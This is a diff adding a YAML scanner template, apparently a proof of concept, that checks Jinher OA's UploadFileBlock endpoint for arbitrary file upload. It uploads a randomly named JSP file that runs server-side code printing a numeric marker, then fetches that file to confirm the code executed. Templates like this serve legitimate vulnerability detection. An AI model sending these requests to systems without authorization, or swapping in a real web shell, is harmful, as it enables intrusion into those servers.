@@ -1,0 +1,56 @@
+id: poc-yaml-jinher-oa-uploadfileblock-anyfile-upload
+info:
+  name: Arbitrary File Upload in 金和OA UploadFileBlock
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(10))}}"
+  t1: "{{rand_int(100, 1000)}}"
+  t2: "{{rand_int(100, 1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/jc6/JHSoft.WCF/Attachment/UploadFileBlock"
+    headers:
+      Content-Type: "multipart/form-data; boundary=bbcea0206207b8222ea7bdee4e0f92fa"
+    body: |
+      --bbcea0206207b8222ea7bdee4e0f92fa
+      Content-Disposition: form-data; name="filename"; filename="{{filename}}.jsp"
+      
+      vulnerability<% out.println({{t1}} * {{t2}}); %>
+      --bbcea0206207b8222ea7bdee4e0f92fa--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"uploadTime\""
+          - "\"realUrl\""
+          - "\"fileObj\""
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+  - id: verify-upload
+    method: GET
+    path:
+      - "/jc6/upload/{{filename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "vulnerability"
+          - "{{t3}}"
+        part: body
